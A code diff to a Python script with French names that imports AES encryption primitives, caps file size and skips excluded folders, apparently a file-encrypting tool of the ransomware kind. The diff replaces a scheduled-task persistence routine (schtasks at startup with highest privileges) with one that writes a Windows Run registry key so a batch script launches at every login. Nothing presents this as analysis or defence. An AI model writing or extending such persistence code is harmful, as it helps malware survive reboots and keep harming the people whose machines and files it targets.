@@ -1,7 +1,7 @@
 import os
 import string
+import winreg
 from pathlib import Path
-import sys
 from cryptography.hazmat.primitives import padding
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -37,25 +37,20 @@ max_size = 100 * 1024 * 1024
 
 
 
-def ajouter_tache_planifiee():
-    try:
-        # seulement .bat
-        dossier = os.path.dirname(os.path.realpath(__file__))
-        bat_path = os.path.join(dossier, "start_script.bat")
-        #--------
-        script_path = os.path.realpath(sys.argv[0])
-        task_name = "test_mon_app"
 
-        cmd = f"""
-        schtasks /create /tn "{task_name}" /tr "{bat_path}" /sc ONSTART /RL HIGHEST /f
-        """
-        result = subprocess.run(["powershell", "-Command", cmd], shell=True)
-        if result.returncode == 0:
-            print("[+] Tâche planifiée créée avec succès.")
-        else:
-            print(f"[!] Erreur lors de la création de la tâche : {result.stderr}")
+def ajouter_run_key():
+    try:
+        nom_valeur = "MonScriptAuto"
+        chemin_script = os.path.join(os.path.dirname(os.path.realpath(__file__)), "script.bat")
+
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Run",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_script)
+        winreg.CloseKey(key)
+        print("[+] Ajouté au démarrage avec Run Key.")
     except Exception as e:
-        print(f"[!] Erreur tâche planifiée: {e}")
+        print(f"[!] Erreur ajout Run Key : {e}")
 
 
 def is_in_excluded_folder(file_path: Path):
